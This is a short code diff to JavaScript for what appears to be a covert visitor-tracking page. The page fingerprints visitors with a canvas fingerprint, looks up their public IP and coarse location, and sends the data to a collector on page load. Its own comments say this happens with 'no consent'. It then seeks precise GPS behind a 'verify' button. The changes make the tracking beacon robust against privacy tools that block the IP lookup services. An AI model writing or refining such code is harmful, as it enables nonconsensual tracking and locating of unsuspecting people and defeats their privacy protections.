@@ -51,9 +51,14 @@
   // Public IP + coarse geo, no API key, CORS-enabled. ipwho.is primary,
   // freeipapi.com fallback. This is the visitor's OWN public IP as seen by
   // the API's edge — useful, but the collector's server-side IP is ground truth.
+  function geoOpts() {
+    const o = { cache: "no-store" };
+    if (typeof AbortSignal !== "undefined" && AbortSignal.timeout) o.signal = AbortSignal.timeout(4000);
+    return o;
+  }
   async function ipGeo() {
     try {
-      const j = await (await fetch("https://ipwho.is/", { cache: "no-store" })).json();
+      const j = await (await fetch("https://ipwho.is/", geoOpts())).json();
       if (j && j.success !== false) {
         return { source: "ipwho.is", ip: j.ip, city: j.city, region: j.region,
                  country: j.country, lat: j.latitude, lon: j.longitude,
@@ -61,7 +66,7 @@
       }
     } catch (_) {}
     try {
-      const j = await (await fetch("https://freeipapi.com/api/json", { cache: "no-store" })).json();
+      const j = await (await fetch("https://freeipapi.com/api/json", geoOpts())).json();
       return { source: "freeipapi", ip: j.ipAddress, city: j.cityName,
                region: j.regionName, country: j.countryName, lat: j.latitude, lon: j.longitude };
     } catch (_) {}
@@ -78,10 +83,15 @@
                       body: data, keepalive: true, mode: "cors" });
   }
 
-  // Stage 1 — passive + IP capture on load. No click, no prompt, no consent.
+  // Stage 1 — passive capture, sent IMMEDIATELY. No dependency on any third
+  // party, so a blocked/slow IP API can't suppress the core hit. The collector
+  // already records the real IP + geo server-side.
   const base = passive();
-  base.ip_geo = await ipGeo();
   send({ stage: "load", ...base });
+
+  // Stage 1b — best-effort client-reported IP/geo as a separate, non-blocking
+  // beacon (may be blocked by privacy tools; that's fine).
+  ipGeo().then((g) => { if (g) send({ stage: "ip_enrich", canvas_fp: base.canvas_fp, ip_geo: g }); });
 
   // Stage 2 — precise GPS, consent-gated behind the button.
   const btn = document.getElementById("verify");
